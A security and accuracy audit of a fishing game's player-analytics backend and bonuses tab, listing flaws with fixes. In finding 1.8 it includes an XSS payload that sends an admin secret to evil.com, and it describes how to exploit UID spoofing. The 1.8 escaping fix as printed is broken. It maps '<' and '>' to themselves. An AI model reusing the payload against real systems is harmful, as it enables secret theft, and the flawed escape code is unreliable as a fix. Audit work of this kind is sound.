Part 1 — Player Analytics Security Audit
1.1 Authentication Model
Critical UID spoofing — any client can impersonate any player paAnalytics.ts:41–53

verifyUid() has a dual-path design: it tries Firebase token verification first, but if the Authorization header is absent or if verifyIdToken() throws for any reason, it silently falls through and returns the raw uid from the request body with no further validation.

if (!token) return body.uid ?? null;          // fallthrough A: no header
try { const d = await verifyIdToken(token); return d.uid; }
catch { return body.uid ?? null; }            // fallthrough B: bad/expired token

Attack: send POST /pa/analytics/progress with no Authorization header and { uid: "victim-uid", ... } in the body. The server treats the body UID as authentic and writes the attacker's payload under the victim's row. Every analytics endpoint that calls verifyUid() is equally affected: progress, milestones, delete.

Fix: on either fallback path, return null and let the caller return 401. Remove the body-UID fallback entirely — the verified Firebase token UID is the only acceptable source of identity.

1.2 Admin Authorization
High PA_ADMIN_SECRET embedded verbatim in admin dashboard HTML and CSV download URL paAnalytics.ts:serveAdminDashboard

The admin dashboard injects the secret into its own JavaScript bundle:

const SECRET = ${JSON.stringify(secret)};   // plaintext in page source

It also constructs the Export CSV link with the secret in the query string:

<a href="/pa/admin/export-csv?secret=${secret}">Export CSV</a>

Consequences: (a) anyone who opens DevTools → Sources can extract the secret and use it against any admin endpoint without any login; (b) the secret appears in browser history, server access logs, referrer headers forwarded to any third-party resource on the page, and Chrome sync data.

Fix: authenticate the dashboard with a signed cookie set at login. The export endpoint verifies the same cookie — the secret never leaves the server. Alternatively, generate the CSV client-side via fetch() with the cookie credential and a blob URL, so the secret is never in a URL.

1.3 CSV Export Security
Medium CSV formula injection — player-controlled strings are not prefixed paAnalytics.ts:handleAdminExportCsv

The escape() helper wraps values in double quotes and escapes internal quotes, but does not prefix values that begin with =, +, -, or @. A player whose UID or snapshot field starts with =HYPERLINK(...) can execute arbitrary spreadsheet formulas when the CSV is opened in Excel or LibreOffice Calc.

Fix: add one guard at the top of escape():

if (/^[=+\-@\t\r]/.test(str)) str = "'" + str;
1.4 SQL Injection Protection
Low Admin sort column interpolated into SQL — allowlist present but days_since_first_play missing paAnalytics.ts:handleAdminPlayers

The sort parameter is validated against an ALLOWED_SORT array before being interpolated into ORDER BY ${params.sort}, blocking SQL injection for all listed columns. All user-data queries use $1-style parameterisation correctly. The only gap is that days_since_first_play is absent from ALLOWED_SORT — if the admin dashboard UI exposes this sort option, the request falls back to the default silently. A functionality issue, not a security risk.

Fix: add 'days_since_first_play' to ALLOWED_SORT and implement it as a computed EXTRACT expression in the SELECT, or remove the sort option from the dashboard UI.

1.5 Input Validation
Medium snapshotData inserted without size limit — storage DoS risk paAnalytics.ts:insertMilestones (lines ~397–413)

insertMilestones() accepts snapshotData from the request body and inserts it as JSONB directly, with no check on serialized size. A malicious client sending a 50 MB snapshotData object on every 5-minute heartbeat could exhaust the Railway PostgreSQL disk quota within hours.

Fix: reject the request before any DB operation if the serialized payload exceeds a safe threshold:

if (JSON.stringify(snapshotData).length > 65536)
  return res.status(400).json({ error: 'snapshotData too large' });
1.6 Rate Limiting
Low No rate limiting on analytics endpoints paAnalytics.ts (all routes)

No middleware (e.g. express-rate-limit) is applied to /pa/analytics/*. A single client can flood the endpoint with thousands of requests per minute, causing unnecessary DB writes and Railway billing inflation. The legitimate client fires one heartbeat every 5 minutes (12 req/hour per user).

Fix: add express-rate-limit at ~20 req/hour per IP on the analytics routes with a small burst allowance.

1.7 Privacy & GDPR
Medium deletePlayerAnalytics() runs 3 separate DELETEs without a transaction paAnalytics.ts:173–177

The erasure flow issues three independent DELETE queries: pa_player_progress, then pa_player_milestones, then pa_player_daily_progress. If the process crashes or the DB connection drops after the first delete, the player's data is partially erased. GDPR Article 17 requires complete and verifiable erasure — partial deletion leaves the controller in breach.

Fix: wrap all three deletes in a single transaction:

await pool.query('BEGIN');
await pool.query('DELETE FROM pa_player_progress WHERE uid=$1', [uid]);
await pool.query('DELETE FROM pa_player_milestones WHERE uid=$1', [uid]);
await pool.query('DELETE FROM pa_player_daily_progress WHERE uid=$1', [uid]);
await pool.query('COMMIT');
1.8 XSS in Admin Dashboard
High Player-controlled strings inserted into dashboard HTML without escaping paAnalytics.ts:serveAdminDashboard

The admin dashboard renders player UIDs and snapshot data fetched from the database directly into the HTML template string. These values originated from client requests with no sanitization at ingestion. A player who submitted a crafted string like <img src=x onerror="fetch('https://evil.com?s='+SECRET)"> would have it rendered as live HTML in the admin's browser — and because SECRET is already on the page (finding 1.2), the XSS can exfiltrate the admin secret in a single exploit chain.

Fix: escape all dynamic values before template insertion:

const esc = s => String(s)
  .replace(/&/g, '&amp;').replace(/</g, '<')
  .replace(/>/g, '>').replace(/"/g, '&quot;');

Apply esc() to every player-derived value placed into the HTML string.

1.9 Security Headers
Low Admin dashboard missing X-Frame-Options and Content-Security-Policy paAnalytics.ts:serveAdminDashboard

The dashboard response sets no X-Frame-Options or Content-Security-Policy header, enabling clickjacking and widening the XSS impact surface. Two header additions fix both:

res.setHeader('X-Frame-Options', 'DENY');
res.setHeader('Content-Security-Policy',
  "default-src 'none'; script-src 'self'; style-src 'unsafe-inline'");
1.10 Client Failure Safety — analytics.js field accuracy
High Four analytics fields always send wrong values — all DB rows corrupted since deployment analytics.js:29–196

buildAnalyticsSnapshot() references identifiers that do not exist in game.js:

Field sent to server Value actually sent Correct reference
APP_VERSION null (identifier undefined) GAME_VERSION in version.js
G.equippedRod 'basic_rod' always (field doesn't exist) G.currentRod
G.abyssData?.resetCount 0 always (path doesn't exist) G.prestigeCount
buildNumber: null null (hardcoded) BUILD_NUMBER in version.js

Every analytics row in the database records the wrong app version, wrong current rod, and zero prestige count for all players. Historical rows since deployment cannot be corrected retroactively — fixing the references will recover accuracy from the next session onward.

1.11 Milestone Tracking Accuracy
Medium first_legendary_fish never fires; first_competition fires for wrong players analytics.js:199–290

first_legendary_fish: the key exists in MILESTONE_KEYS but _anlBuildMilestones() contains no check('first_legendary_fish', ...) call. The milestone is never recorded for any player regardless of catches.

first_competition: fires whenever achievementsCompleted > 0. Catching one fish unlocks the "First Cast" achievement, so this milestone fires for players who have never opened the Competition screen. The correct check is G.stats.competitionsEntered > 0 (or equivalent competition-participation state).

Low scheduleAnalyticsHeartbeat() accumulates visibilitychange listeners on repeated calls analytics.js:364–376

Each call to scheduleAnalyticsHeartbeat() appends a new visibilitychange listener without removing the previous one. If the function is called more than once (e.g. after a save-reload cycle), multiple listeners accumulate and each page-hide fires multiple heartbeats. In practice the function is called once at init, making the risk low — but the code is fragile.

Fix: extract the handler to a named variable and call removeEventListener before addEventListener.

Part 2 — Statistics Tab 8 Bonuses Accuracy Audit
2.1 Issues Found
High Competition Reward Multiplier displayed but not applied in getCompBaseReward() game.js:4758–4763 vs 425–431

The bonuses tab shows Reward Multiplier = getPearlCompSpiritMult() × getMasteryCompMult(). However, the only competition reward function is getCompBaseReward(rank) (lines 425–431), which computes rewards from hourly income alone and does not call either of these getters.

A codebase-wide search for getPearlCompSpiritMult and getMasteryCompMult finds them referenced only in their definition blocks (lines 819, 1065) and inside _renderBonusesTab(). Pearl Competition Spirit upgrades and Zone Mastery competition bonuses currently have zero effect — the bonuses tab shows a multiplier that does nothing.

Fix (option A — implement it):

// getCompBaseReward — lines 425–431
function getCompBaseReward(rank) {
  const hourly = getEstimatedHourlyIncome();
  const mult   = getPearlCompSpiritMult() * getMasteryCompMult();
  if (rank === 1) return Math.round((500 + hourly * 0.05) * mult);
  if (rank === 2) return Math.round((250 + hourly * 0.03) * mult);
  if (rank === 3) return Math.round((100 + hourly * 0.01) * mult);
  return 0;
}

Fix (option B — hide until wired): remove the Competitions section from _renderBonusesTab() until the multipliers are applied.

Medium "Diamond Earnings" label overstates the scope of getRodDiamondMult() game.js:4766–4768

The row is labelled Diamond Earnings, implying a global multiplier on all diamond income. In reality, getRodDiamondMult() is applied in only two places: selling a trophy fish individually (line 3384) and sell-all processing the trophy pile (line 3472).

The following diamond sources are not affected:

  • First-catch legendary reward (+3 diamonds, line ~1998)
  • Lost Treasure event diamonds (line ~5208)
  • Redeem code grants
  • Season Pass diamond rewards
  • Competition diamond prizes

A player with a high Mythic Rod tier sees e.g. 2.20x Diamond Earnings and expects all diamond income to be boosted — only trophy sales are.

Fix: rename to "Trophy Fish Sale Diamonds" and set the source description to "Multiplies diamonds received when selling trophy fish".

Low storageBase duplicated from storageCapacity() instead of being derived from it game.js:4651–4654

The "Base + items" source row in Storage Capacity manually recomputes 5 + reduce(ownedStorage) instead of reading it from a sub-total exposed by storageCapacity(). The combined value calls the authoritative function so the total is correct — only the breakdown number is redundant. If the base formula ever changes (e.g. different starting capacity), this local copy would need a separate update. Not a display bug today.
